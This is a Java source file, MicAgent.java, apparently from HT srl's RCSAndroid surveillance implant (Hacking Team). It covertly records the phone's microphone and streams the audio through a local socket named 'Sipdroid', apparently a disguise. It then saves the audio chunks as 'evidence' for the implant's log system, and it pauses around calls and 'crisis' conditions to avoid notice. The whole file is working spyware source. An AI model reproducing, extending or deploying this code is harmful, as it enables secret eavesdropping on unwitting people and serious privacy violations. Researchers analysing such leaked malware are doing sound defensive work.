/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : MicAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.agent;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.util.Random;

import android.media.MediaRecorder;
import android.net.LocalServerSocket;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.util.Log;

import com.ht.RCSAndroidGUI.Call;
import com.ht.RCSAndroidGUI.LogR;
import com.ht.RCSAndroidGUI.StateRun;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.evidence.EvidenceType;
import com.ht.RCSAndroidGUI.file.AutoFile;
import com.ht.RCSAndroidGUI.file.Path;
import com.ht.RCSAndroidGUI.interfaces.Observer;
import com.ht.RCSAndroidGUI.listener.ListenerCall;
import com.ht.RCSAndroidGUI.util.Check;
import com.ht.RCSAndroidGUI.util.DataBuffer;
import com.ht.RCSAndroidGUI.util.DateTime;
import com.ht.RCSAndroidGUI.util.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class MicAgent. 8000KHz, 32bit
 * 
 * @ref: http://developer.android.com/reference/android/media/MediaRecorder.html
 *       Recipe: Recording Audio Files Recording audio using MediaRecorder is
 *       similar to playback from the previous recipe, except a few more things
 *       need to be specified (note, DEFAULT can also be used and is the same as
 *       the first choice in these lists): n MediaRecorder.AudioSource: n
 *       MIC�Built-in microphone n VOICE_UPLINK�Transmitted audio during voice
 *       call n VOICE_DOWNLINK�Received audio during voice call n
 *       VOICE_CALL�Both uplink and downlink audio during voice call n
 *       CAMCORDER�Microphone associated with camera if available n
 *       VOICE_RECOGNITION�Microphone tuned for voice recognition if available n
 *       MediaRecorder.OutputFormat: n THREE_GPP�3GPP media file format n
 *       MPEG_4�MPEG4 media file format n AMR_NB�Adaptive multirate narrowband
 *       file format Audio 157 158 Chapter 6 Multimedia Techniques n
 *       MediaRecorder.AudioEncoder: n AMR_NB�Adaptive multirate narrowband
 *       vocoder The steps to record audio are 1. Create an instance of the
 *       MediaRecorder: MediaRecorder m_Recorder = new MediaRecorder(); 2.
 *       Specify the source of media, for example the microphone:
 *       m_Recorder.setAudioSource(MediaRecorder.AudioSource.MIC); 3. Set the
 *       output file format and encoding, such as:
 *       m_Recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
 *       m_Recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB); 4. Set
 *       the path for the file to be saved: m_Recorder.setOutputFile(path); 5.
 *       Prepare and start the recording: m_Recorder.prepare();
 *       m_Recorder.start(); These steps for audio recording can be used just as
 *       they were in the previous recipe for playback.
 * @author zeno
 */
public class MicAgent extends AgentBase implements Observer<Call> {

	private static final long MIC_PERIOD = 5000;
	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };

	private static final String TAG = "MicAgent";

	/** The recorder. */
	MediaRecorder recorder;
	StateRun state;
	Object stateLock = new Object();

	private int numFailures;
	private long fId;

	private LocalSocket receiver;
	private LocalServerSocket lss;
	private LocalSocket sender;
	private InputStream is;

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#begin()
	 */
	@Override
	public void begin() {
		try {
			synchronized (stateLock) {
				if (state != StateRun.STARTED) {
					addPhoneListener();
					recorder = new MediaRecorder();

					final DateTime dateTime = new DateTime();
					fId = dateTime.getFiledate();

					startRecorder();
					Log.d("QZ", TAG + "started");
				}
				state = StateRun.STARTED;
			}
		} catch (IllegalStateException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#end()
	 */
	@Override
	public void end() {
		synchronized (stateLock) {
			if (state == StateRun.STARTED) {
				removePhoneListener();

				Check.ensures(state != StateRun.STOPPED, "state == STOPPED");

				saveRecorderEvidence();
				stopRecorder();
				recorder.release();
				recorder = null;
			}
			state = StateRun.STOPPED;

		}
		Log.d("QZ", TAG + "stopped");

	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.ThreadBase#go()
	 */
	@Override
	public void go() {
		synchronized (stateLock) {
			if (state == StateRun.STARTED) {
				int amp = recorder.getMaxAmplitude();
				int audio = recorder.getAudioSourceMax();

				if (amp != 0) {
					Log.d("QZ", TAG + " (go): max amplitude=" + amp);
				}
				if (audio != 0) {
					Log.d("QZ", TAG + " (go): max audio=" + audio);
				}

				if (numFailures < 10) {
					saveRecorderEvidence();

				} else {
					Log.d("QZ", TAG + "numFailures: " + numFailures);
					suspend();
				}

				if (Status.self().crisisMic()) {
					Log.d("QZ", TAG + "crisis, suspend!");
					suspend();
				}
			}
		}
	}

	private void addPhoneListener() {
		ListenerCall.self().attach(this);
	}

	private void removePhoneListener() {
		ListenerCall.self().detach(this);
	}

	private void saveRecorderEvidence() {

		Check.requires(recorder != null, "saveRecorderEvidence recorder==null");


		final byte[] chunk = getAvailable();

		if (chunk != null && chunk.length > 0) {

			int offset = 0;
			if (Utils.equals(chunk, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
				offset = AMR_HEADER.length;
			}
			
			byte[] data;
			if (offset == 0) {
				data = chunk;
			} else {
				data = Utils.copy(chunk, offset, chunk.length - offset);
			}

			new LogR(EvidenceType.MIC, getAdditionalData(), data);

		} else {
			Log.d("QZ", TAG + "zero chunk ");
			numFailures += 1;
		}
	}

	private byte[] getAvailable() {
		byte[] ret = null;
		try {
			if (receiver.isBound() && receiver.isConnected()) {
				if (is == null) {
					is = receiver.getInputStream();
				}

				int available = is.available();
				ret = new byte[available];
				is.read(ret);
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		return ret;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(AgentConf conf) {
		byte[] confParameters = conf.getParams();
		final DataBuffer databuffer = new DataBuffer(confParameters, 0,
				confParameters.length);

		try {
			int vad = databuffer.readInt();
			int value = databuffer.readInt();
		} catch (IOException e) {
			return false;
		}
		setPeriod(MIC_PERIOD);
		setDelay(MIC_PERIOD);
		return true;
	}

	private void restartRecorder() {
		try {
			stopRecorder();
			startRecorder();
		} catch (IllegalStateException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	/**
	 * Start recorder.
	 * 
	 * @throws IllegalStateException
	 *             the illegal state exception
	 * @throws IOException
	 *             Signals that an I/O exception has occurred.
	 */
	private void startRecorder() throws IllegalStateException, IOException {

		numFailures = 0;

		// lastRecFile = currentRecFile;
		// currentRecFile = Path.hidden() + "currentRec" + Utils.getTimeStamp();

		// LocalServerSocket socket = new LocalServerSocket("currentRecSocket");
		createSockets();

		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

		recorder.setOutputFile(sender.getFileDescriptor());

		recorder.prepare();
		recorder.start(); // Recording is now started

	}

	private void createSockets() {
		receiver = new LocalSocket();
		try {
			lss = new LocalServerSocket("Sipdroid");
			receiver.connect(new LocalSocketAddress("Sipdroid"));
			receiver.setReceiveBufferSize(500000);
			receiver.setSendBufferSize(500000);
			sender = lss.accept();
			sender.setReceiveBufferSize(500000);
			sender.setSendBufferSize(500000);
		} catch (IOException e) {
			Log.d("QZ", TAG + " (createSockets) Error: " + e);
		}
	}

	// SNIPPET
	/**
	 * Stop recorder.
	 */
	private void stopRecorder() {
		if (recorder != null) {
			recorder.stop();
			recorder.reset(); // You can reuse the object by going back to
								// setAudioSource() step
			// recorder.release(); // Now the object cannot be reused
			getAvailable();

			// File file = new File(currentRecFile);
			// file.delete();

			try {
				sender.close();
				receiver.close();
				lss.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

		}
	}

	private byte[] getAdditionalData() {
		final int LOG_MIC_VERSION = 2008121901;
		// LOG_AUDIO_CODEC_SPEEX 0x00;
		final int LOG_AUDIO_CODEC_AMR = 0x01;
		final int sampleRate = 8000;

		final int tlen = 16;
		final byte[] additionalData = new byte[tlen];

		final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen);

		databuffer.writeInt(LOG_MIC_VERSION);
		databuffer.writeInt(sampleRate | LOG_AUDIO_CODEC_AMR);
		databuffer.writeLong(fId);

		Check.ensures(additionalData.length == tlen, "Wrong additional data name");

		return additionalData;
	}

	public void notification(Call call) {
		if(call.isOngoing()){
			Log.d("QZ", TAG + " (notification): call incoming, suspend");
			//suspend();
			AgentManager.self().suspend(this);
		}else{
			Log.d("QZ", TAG + " (notification): ");
			AgentManager.self().resume(this);
		}
		
	}
}
